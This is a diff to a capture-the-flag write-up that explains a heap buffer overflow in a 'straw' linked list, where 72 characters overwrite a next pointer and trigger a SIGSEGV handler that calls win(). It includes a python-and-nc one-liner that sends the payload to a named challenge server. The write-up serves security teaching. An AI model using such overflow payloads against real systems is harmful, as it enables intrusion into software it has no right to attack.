@@ -21,7 +21,7 @@ struct straw {
 };
 ```
 
-The memory layout is therefore:
+The memory layout can be represented as such. The ptr will be 8 bytes on a 64 bit machine and data is 64 byte char array:
 
 ```text
 offset 0x00: next_ptr — 8 bytes
@@ -44,11 +44,19 @@ Initially, the list contains one straw:
 straw 0 -> NULL
 ```
 
-After creating two more straws, the list becomes:
+We need **three total straws**, so we enter `1` twice. The list then becomes:
 
 ```text
 straw 0 -> straw 1 -> straw 2 -> NULL
 ```
+
+This distinction matters. With only one `1`, the list is:
+
+```text
+straw 0 -> straw 1 -> NULL
+```
+
+The overflow from straw 0 reaches straw 1's `next_ptr`, but straw 1 is already the final node and its pointer is `NULL`. With three total straws, straw 1's pointer contains the address of straw 2. Corrupting that non-null pointer gives the later traversal an invalid address to follow.
 
 Editing straw 0 with 72 characters overflows into the memory occupied by straw 1 and corrupts its `next_ptr`:
 
@@ -82,8 +90,8 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 
 The steps are:
 
-1. Create straw 1.
-2. Create straw 2.
+1. Create straw 1. There is now one additional straw.
+2. Create straw 2. There are now three straws total, creating a non-null pointer that can be corrupted.
 3. Select the edit option.
 4. Edit straw 0.
 5. Enter exactly 72 `A` characters.
@@ -92,11 +100,10 @@ The steps are:
 The payload can be sent automatically with:
 
 ```bash
-python3 -c 'print("1\n1\n2\n0\n" + "A"*72 + "\n1\n")' | nc HOST PORT
+python3 -c 'print("1\n1\n2\n0\n" + "A"*72 + "\n1\n")' | nc challs.nusgreyhats.org 32000
 ```
 
-Replace `HOST` and `PORT` with the challenge server address.
 
 ## Conclusion
 
-The challenge is solved by combining a heap-based buffer overflow with the existing `SIGSEGV` handler. The oversized input corrupts the linked-list pointer, and the next list traversal causes the segmentation fault that invokes `win()`.
+The challenge is solved by combining a heap based buffer overflow with the existing `SIGSEGV` handler. The oversized input corrupts the linked-list pointer, and the next list traversal causes the segmentation fault that invokes `win()`.
